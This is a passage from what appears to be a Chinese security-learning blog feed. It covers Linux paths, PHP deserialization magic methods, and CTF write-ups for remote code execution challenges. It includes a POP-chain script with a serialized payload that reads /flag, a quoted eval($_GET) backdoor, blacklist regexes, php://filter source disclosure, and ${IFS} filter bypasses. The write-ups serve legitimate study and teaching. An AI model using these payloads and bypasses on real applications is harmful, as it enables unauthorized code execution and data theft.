file.txt</code></td></tr><tr><td><code>which</code></td><td>查找命令路径（可执行文件）</td><td><code>which python</code></td></tr><tr><td><code>whereis</code></td><td>查找命令源文件&#x2F;帮助文档等</td><td><code>whereis ls</code></td></tr></tbody></table><h2 id="绝对路径和相对路径"><a href="#绝对路径和相对路径" class="headerlink" title="绝对路径和相对路径"></a>绝对路径和相对路径</h2><p>路径是指文件和目录的引用方式。它给出了文件或目录在 [Linux 目录结构](<a href="https://so.csdn.net/so/search?q=Linux">https://so.csdn.net/so/search?q=Linux</a> 目录结构&amp;spm&#x3D;1001.2101.3001.7020)中的位置，由名称和斜杠组成。</p><h3 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h3><p>以字符 <code>/</code> 开头（代表根目录，所有其他文件和目录都在其中）。之后依次列出到达目标文件所需经过的每个子目录，每个名称之间用 <code>/</code> 分隔。。</p><p>例如，<code>/home/liujie/桌面/file.txt</code>是一个绝对路径，它明确指定了文件<code>file.txt</code>的位置。</p><p>绝对路径始终指向相同的位置，不受当前工作目录的变化影响。这使得它们在脚本和<a href="https://so.csdn.net/so/search?q=%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6&spm=1001.2101.3001.7020">配置文件</a>中非常有用，因为它们的行为是可预测的。</p><p><strong>绝对路径</strong>：在需要确保文件或目录位置始终一致的情况下使用绝对路径。这对于脚本、配置文件和需要完全确定位置的任务非常重要</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250708103126925.png" alt="image-20250708103126925"></p><h3 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h3><p>相对路径是相对于当前工作目录的路径描述。它告诉系统如何从当前位置找到目标文件或目录。相对路径通常使用以下几种符号：</p><p><code>.</code>：表示当前目录。例如，.&#x2F;file.txt表示当前目录中的文件。</p><p><code>..</code>：表示上一级目录。例如，..&#x2F;parent_directory&#x2F;file.txt表示上一级目录中的文件。</p><p><code>目录名</code>：表示当前目录中的子目录。例如，subdir&#x2F;file.txt表示当前目录下的子目录中的文件。</p><p>相对路径相对简洁，但依赖于当前工作目录，因此可能在不同位置使用时产生不同的效果。</p><p><strong>相对路径</strong>：通常在当前工作目录不会改变的情况下使用相对路径。手动浏览文件系统或在脚本中执行相对路径的命令时，相对路径是有用的。</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250708101406856.png" alt="image-20250708101406856"></p><h3 id="特殊路径符"><a href="#特殊路径符" class="headerlink" title="特殊路径符"></a>特殊路径符</h3><p><code>.</code> :  表示当前目录，比如 cd .&#x2F;Desktop 表示切换到当前目录下的Desktop目录中，和 cd Desktop效果一致。<br><code>..</code>: 表示上一级目录，比如 cd .. 即可切换到上一级目录， cd ..&#x2F;.. 切换到上二级的目录<br><code>~</code>  : 表示HOME目录，比如：cd ~即可切换到home目录。cd ~&#x2F;Desktop,切换到Home内的Desktop目录。</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250708104357969.png" alt="image-20250708104357969"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux用户、文件权限、目录、路径&quot;&gt;&lt;a href=&quot;#Linux用户、文件权限、目录、路径&quot; class=&quot;headerlink&quot; title=&quot;Linux用户、文件权限、目录、路径&quot;&gt;&lt;/a&gt;Linux用户、文件权限、目录、路径&lt;/h1&gt;&lt;p&gt;内容主要出处</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>反序列化漏洞学习</title>
    <link href="http://example.com/2025/04/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2025/04/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-04-07T09:23:28.000Z</published>
    <updated>2025-04-07T09:24:06.601Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化漏洞分析"><a href="#PHP反序列化漏洞分析" class="headerlink" title="PHP反序列化漏洞分析"></a>PHP反序列化漏洞分析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ol><li><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241210170102320.png" alt="image-20241210170102320"></li></ol><p>对于字符串来说，比<code>PHP</code>对象更容易存储、在网络上进行传输；</p><p>对象有比较复杂的内存结构，有属性，有方法，有属性的值，有属性的访问控制权限等，这样非常复杂的内存结构很难在网络是传输，</p><p><code>serialize()</code>: 序列化，参数传入的是一个对象，输出是字符串；</p><p><code>unserialize()</code>：反序列化， 输入是字符串，输出是一个对象；</p><ol start="2"><li><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241210170436061.png" alt="image-20241210170436061"></p><ul><li>在test这个类里，有三个属性<code>flag，test，test1</code>，他们有这不同的访问控制权限；</li><li>他们还各自有两个方法：<code>set_flag ,get_flag</code> ,</li><li><code>$object = new test()</code> :实例化这样一个对象；</li><li><code>$object -&gt;set_flag(&#39;Active&#39;)&quot;</code>：调用这个对象的<code>set_flag</code>方法，相当于把<code>$flag</code>从<code>Inactive</code>改为<code>Active</code>；</li><li><code>$data = serialize($object)</code>:对它做序列化操作；</li><li>打印输出，就是右侧这个样子；</li></ul></li><li><p>保留了这个对象的所有属性名（<code>falg,test,test1</code>)；保留了它的属性值（<code>Active,test,test1</code>）；还保留了这些属性的访问控制权限</p><p><code>public</code>成员变量的名字直接写就行；</p><p><code>protected</code>成员变量的名字前需要加上%00*%00；</p><p><code>private</code>成员变量的名字前需要加上%00类名%00；</p></li><li><p>序列化的过程，只序列化属性，不序列化方法；</p><p>序列化后就看不到get_flag；</p></li><li><p>反序列化过程，从右边字符串展开到左边对象这个过程， </p></li><li><p>反序列化的漏洞：攻击者精心构造一个右边的字符串，输进这个系统里，然后在它转换成对象的过程中，实现攻击。</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;john&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isOK</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_username</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;usernme;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialized</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;%00&quot;</span>, <span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;整型 &quot;</span> . <span class="title function_ invoke__">serialize</span>(<span class="number">10</span>) . PHP_EOL;<span class="comment">//.PHP_EOL，预定义常量，换行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;浮点型 &quot;</span> . <span class="title function_ invoke__">serialize</span>(<span class="number">13.14</span>).PHP_EOL; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;字符串 &quot;</span> . <span class="title function_ invoke__">serialize</span>(<span class="string">&quot;This is a string&quot;</span>). PHP_EOL; <span class="comment">// 字符串 s:16:&quot;This is a string&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;布尔型 &quot;</span> . <span class="title function_ invoke__">serialize</span>(<span class="literal">FALSE</span>). PHP_EOL; <span class="comment">// 布尔型 b:0;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NULL &quot;</span> . <span class="title function_ invoke__">serialize</span>(<span class="literal">NULL</span>). PHP_EOL; <span class="comment">// NULL N;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;数组 &quot;</span> . <span class="title function_ invoke__">serialize</span>([<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>, <span class="string">&#x27;baz&#x27;</span>]). PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250402185723022.png" alt="image-20250402185723022"></p><table><thead><tr><th align="left">首字符</th><th align="left">数据类型</th><th align="left">示例序列化字符串</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>a</code></td><td align="left">Array</td><td align="left"><code>a:3:&#123;i:0;i:1;i:1;s:3:&quot;two&quot;;i:2;i:3;&#125;</code></td><td align="left">数组</td></tr><tr><td align="left"><code>b</code></td><td align="left">Boolean</td><td align="left"><code>b:1;</code> 或 <code>b:0;</code></td><td align="left">布尔值(true&#x2F;false)</td></tr><tr><td align="left"><code>d</code></td><td align="left">Double&#x2F;Float</td><td align="left"><code>d:3.14;</code></td><td align="left">浮点数</td></tr><tr><td align="left"><code>i</code></td><td align="left">Integer</td><td align="left"><code>i:42;</code></td><td align="left">整数</td></tr><tr><td align="left"><code>N</code></td><td align="left">NULL</td><td align="left"><code>N;</code></td><td align="left">空值</td></tr><tr><td align="left"><code>O</code></td><td align="left">Object</td><td align="left"><code>O:8:&quot;stdClass&quot;:0:&#123;&#125;</code></td><td align="left">对象</td></tr><tr><td align="left"><code>r</code></td><td align="left">Reference</td><td align="left"><code>r:1;</code></td><td align="left">引用(已弃用)</td></tr><tr><td align="left"><code>R</code></td><td align="left">Reference</td><td align="left"><code>R:1;</code></td><td align="left">对象引用</td></tr><tr><td align="left"><code>s</code></td><td align="left">String</td><td align="left"><code>s:5:&quot;hello&quot;;</code></td><td align="left">字符串</td></tr><tr><td align="left"><code>S</code></td><td align="left">Escaped String</td><td align="left"><code>S:5:&quot;\61\62\63&quot;;</code></td><td align="left">转义字符串(二进制安全)</td></tr><tr><td align="left"><code>C</code></td><td align="left">Custom Object</td><td align="left"><code>C:11:&quot;MyClass&quot;:5:&#123;...&#125;</code></td><td align="left">实现了Serializable接口的对象</td></tr></tbody></table><h2 id="反序列化攻击概述"><a href="#反序列化攻击概述" class="headerlink" title="反序列化攻击概述"></a>反序列化攻击概述</h2><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241210171558290.png" alt="image-20241210171558290"></p><p>有些方法往往已经存在，并会被调用。</p><p>构造函数，析构函数等（在C++中一定会被调用），在<code>PHP</code>中也存在这些方法，称为魔术方法。</p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241210172228879.png" alt="image-20241210172228879"></p><p>  一般的方法，需要我们手动调用，比如：object -&gt;方法名称（参数）这样调用，上图就无须这样。</p><p>反序列化只能控制属性，没办法控制反序列化后这个代码会调用什么方法，而魔术方法的调用，是在满足某种条件下会自动调用的，无需人工写一些代码去调用，所有只要在魔术方法当中存在一些我们能利用的函数，我们就能够通过反序列化，对这个对象的属性做特殊的操控，进而影响对这些函数的调用逻辑，来实现我们攻击的目的。</p><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241216143908179.png" alt="image-20241216143908179"></p><p>可以把他理解为<code>PHP</code>里的构造函数：当一个对象被实例化的时候，就会自动被调用</p><p>在A这个类，有一个<code>__construct()</code>魔术方法，它会输出”This is a construct function”这句话，当代码执行到第10行”$a &#x3D; new A()”$a这个变量，它是A的实例化的时候，紧接着他就会自动的去实行4~8行这个方法，所以屏幕上就会出现那句话。</p><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241216145059245.png" alt="image-20241216145059245"></p><p>可以理解为PHP中的析构函数：当一个对象的内存空间被回收的时候，就会自动调用它的析构函数，</p><p>A这个类中，有两个魔术方法 __ construct()  ,__ destruct(),当代码执行15行代码，对A这个对象进行实例化的时候，会自动调用第4行的 __ construct()这个方法，然后程序执行结束，a这个对象的内存空间会被回收，在此之前这个对象要被析构掉，在这个PHP代码执行结束之前，还会执行第9行这__ destruct()这个方法，所以这个屏幕上会出翔两行字。</p><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241216151201685.png" alt="image-20241216151201685"></p><p>在序列化的时候，会被调用，他原本的目的是返回一个需要被序列化的属性数组。</p><p>在A这个类里有两个属性：test，test2，有两个魔术方法__ construct()，__ sleep()，construct()不再赘述，在执行第18行代码对a这个属性做序列化的时候，就会 自动调用a所属的类是__ sleep()这个魔术方法：先输出这个字符串，再返回一个数组，数组里面包含需要被序列化的属性的名称，换句话说，这个a这个对象有两个属性test，和test2，返回的这个数组，表明只有test这个属性会被序列化。这是sleep这个方法本身的含义</p><p>对于我们来说，我们需要知道是的是它调用的时机，当看到序列化函数的时候，就知道sleep这个方法一定会被调用。</p><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241216151712426.png" alt="image-20241216151712426"></p><p>再反序列化的时候被自动调用</p><p>24：这个反序列化这个过程看起来像是也构造一个对象一样，但是，他不会调用这个对象的construct魔术方法，会调用这个对象的wakeup魔术方法。</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241216152203081.png" alt="image-20241216152203081"></p><p>当我们把一个对象当作字符串来使用的时候，就等价于调用它的toString魔术方法，</p><p>17：再输出$a：把$a这个对象当作字符串来使用，就会调用toString这个魔术方法，最后屏幕上就会输出：”This is a toString function”。</p><h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241216152726842.png" alt="image-20241216152726842"></p><p>当把一个对象当作函数来使用的时候，就会调用invoke魔术方法</p><p>16:$a是一个对象，但再a后边加了()，相当于按照一个函数一样的在调用这个对象，16行的函数调用就等价于9行这个invoke这个魔术方法的实行。</p><h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241216153851465.png" alt="image-20241216153851465"></p><p>在调用一个对象不存在的方法时候，就等价于调用call魔术方法</p><p>A这个类并不存在test这个魔术方法，但他却同时定义了call魔术方法，17行在调用test这个魔术方法的时候，就等价于调用call这个方法，</p><p>call魔术方法会接收两个参数，第一个参数：是调用的那个并不存在的魔术方法名（test），第二个：是他所传入的参数（’no’，’this’，’function’）</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><table><thead><tr><th>名称</th><th>触发机制</th></tr></thead><tbody><tr><td>__construct()</td><td>在对象实例化（创建对象）的时候自动触发</td></tr><tr><td>__destruct()</td><td>在销毁对象的时候自动触发</td></tr><tr><td>__wakeup()</td><td>执行unserialize()时，先会调用这个函数</td></tr><tr><td>__sleep()</td><td>执行serialize()时，先会调用这个函数</td></tr><tr><td>__call()</td><td>在对象上下文中调用不可访问的方法时触发</td></tr><tr><td>__get()</td><td>访问私有或不存在的成员属性的时候自动触发</td></tr><tr><td>__set()</td><td>对私有成员属性进行设置值时自动触发</td></tr><tr><td>__isset()</td><td>对私有成员属性进行 isset 进行检查时自动触发</td></tr><tr><td>__unset()</td><td>对私有成员属性进行 unset 进行检查时自动触发</td></tr><tr><td>__toString()</td><td>把类当作字符串使用时触发</td></tr><tr><td>__invoke()</td><td>当尝试将对象调用为函数时触发</td></tr></tbody></table><h2 id="反序列化攻击"><a href="#反序列化攻击" class="headerlink" title="反序列化攻击"></a>反序列化攻击</h2><p>组建攻击链：各种魔术方法组合起来，最终形成一个可以实现我们攻击目的的一个攻击链</p><h3 id="反序列化攻击样例"><a href="#反序列化攻击样例" class="headerlink" title="反序列化攻击样例"></a>反序列化攻击样例</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241216193233111.png" alt="image-20241216193233111"></p><p>25：反序列化攻击的入口，</p><p>反序列化攻击，需要我们构造对应的序列化字符串，需要把其中的某一个类，把它序列化掉，通过控制它的属性来实现攻击</p><p>现在有三个类，可以向其中传入一个实例化的对象，可以先排除后两个对象（后两个反序列化后没有任何意义：它没有调用任何的方法），放入Aurora这个实例化的类，construct魔术方法无法调用（在反序列化中，调用的是<code>__wakeup()</code>），调用destruct魔术方法：调用test属性的action方法。test里必须放入一个能被action方法的值，</p><p>例如：可以把Auroa对象的test属性附成是一个L对象，屏幕上会出翔”CUMT”；</p><p>往test属性，附一个Evil对象：Evil属性的action方法会被调用，</p><p>eval（）：任意命令执行；</p><p>构造序列化字符串：必须代表一个Aurora对象；这个Aurora对象的test属性必须是一个eval对象；这个eval对象的test2属性必须是一个我们想要执行的命令</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250403141822772.png" alt="image-20250403141822772"></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250403143210935.png" alt="image-20250403143210935"></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250403143327027.png" alt="image-20250403143327027"></p><p><a href="https://www.nssctf.cn/problem/2099">https://www.nssctf.cn/problem/2099</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$try</span>=<span class="keyword">new</span> <span class="title class_">Try_Work_Hard</span>;</span><br><span class="line"><span class="variable">$make</span>=<span class="keyword">new</span> <span class="title class_">Make_a_Change</span>;</span><br><span class="line"><span class="variable">$make</span>-&gt;effort=<span class="variable">$try</span>;</span><br><span class="line"><span class="variable">$road</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>;</span><br><span class="line"><span class="variable">$road</span>-&gt;<span class="keyword">string</span>=<span class="variable">$make</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;page=<span class="variable">$road</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//O%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BO%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BN%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A49%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fflag%22%3B%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP反序列化漏洞分析&quot;&gt;&lt;a href=&quot;#PHP反序列化漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化漏洞分析&quot;&gt;&lt;/a&gt;PHP反序列化漏洞分析&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;head</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>RCE1.0</title>
    <link href="http://example.com/2025/03/21/RCE1-0/"/>
    <id>http://example.com/2025/03/21/RCE1-0/</id>
    <published>2025-03-21T12:55:21.000Z</published>
    <updated>2025-03-21T12:58:20.628Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-NSSRound-8-Basic-MyDoor"><a href="#1-NSSRound-8-Basic-MyDoor" class="headerlink" title="1.[NSSRound#8 Basic]MyDoor"></a>1.[NSSRound#8 Basic]MyDoor</h2><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20150213.png"></p><p>什么也没有，</p><p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</p><p>然后解码：</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20145921.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">**`<span class="meta">&lt;?php</span>`**</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);`**</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/index.php?file=&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>error_reporting(0);</code></strong> 关闭了所有的错误报告。</p><ul><li>因为_作为参数在php是非法的，所以需要用[来替代</li></ul><p><strong><code>eval($_GET[&#39;N_S.S&#39;]);</code></strong></p><ul><li>如果 URL 参数 <code>N_S.S</code> 存在，会将其内容作为 PHP 代码执行</li></ul><p><strong>文件包含逻辑</strong></p><ul><li>如果 URL 参数 <code>file</code> 不存在，会重定向到 <code>index.php?file=</code>。</li><li>如果 <code>file</code> 参数存在，会检查其值是否包含黑名单中的字符串（如 <code>..</code>, <code>la</code>, <code>data</code>, <code>input</code>, <code>glob</code>, <code>gopher</code>, <code>file</code>, <code>http</code>, <code>phar</code>, <code>localhost</code>, <code>?</code>, <code>*</code>, <code>~</code>, <code>zip</code>, <code>7z</code>, <code>compress</code> 等）。</li><li>如果 <code>file</code> 参数的值通过黑名单检查，会将其作为文件路径包含进来（<code>include $file;</code>）</li></ul><p>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候，php会将怪异的变量名转换成有效的，在进行解析时会删除空白符，并将空格、+、点、[ 转换为下划线。但是用一个特性是可以绕过的，就是当 [ 提前出现后，[ 会转换成下划线，而后面的字符就不会再被转义了。</p><p>方法一：</p><p>有些题目会将 flag 或敏感信息存储在环境变量中。通过 <code>env</code> 命令可以快速查看当前环境变量，寻找可能的线索。</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%25E5%25B1%258F%25E5%25B9%2595%25E6%2588%25AA%25E5%259B%25BE%25202025-03-16%2520151649.png"></p><p>NSSCTF{61c40417-c85a-4942-9ea4-372a0816557c}</p><p>方法二：</p><p><code>phpinfo()</code> 是 PHP 中的一个内置函数，用于<strong>显示当前 PHP 环境的配置信息</strong>。它会输出一个详细的 HTML 页面，包含 PHP 版本、服务器信息、加载的扩展、配置文件路径、环境变量等信息。</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250318194528793.png" alt="image-20250318194528793"></p><h2 id="2-MoeCTF-2021-babyRCE"><a href="#2-MoeCTF-2021-babyRCE" class="headerlink" title="2.[MoeCTF 2021]babyRCE"></a>2.[MoeCTF 2021]babyRCE</h2><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20154052.png"></p><ol><li>禁止使用 cat more less head tac tail nl od vi vim sort（防止读取文件）。</li><li>禁止使用 空格（ ）、分号（;）、数字（0-9）、星号（*）、反引号（&#96;）、百分号（%）、重定向符号（&gt; &lt;）、引号（’ “）</li><li>过滤了空格的话，用${IFS}</li></ol><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20154308.png"></p><p>直接cat,</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20154504.png"></p><p>啥也没有，查看源代码；</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20154531.png"></p><p>NSSCTF{c09a935e-7121-4336-909b-f9e82dd27d79}</p><h2 id="3-SWPUCTF-2023-秋季新生赛-RCE-PLUS"><a href="#3-SWPUCTF-2023-秋季新生赛-RCE-PLUS" class="headerlink" title="3.[SWPUCTF 2023 秋季新生赛]RCE-PLUS"></a>3.[SWPUCTF 2023 秋季新生赛]RCE-PLUS</h2><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20171105.png"></p><ol><li><strong><code>error_reporting(0);</code></strong><ul><li>关闭错误提示，防止泄露敏感信息。</li></ul></li><li><strong><code>highlight_file(__FILE__);</code></strong><ul><li>高亮显示当前文件的源代码。</li></ul></li><li><strong><code>strCheck</code> 函数</strong><ul><li>对用户输入的 <code>cmd</code> 参数进行黑名单过滤。</li><li>黑名单包括：<ul><li>特殊字符：<code>;</code>, <code>&amp;</code>, <code>$</code>, <code>\x09</code>（Tab 键）, 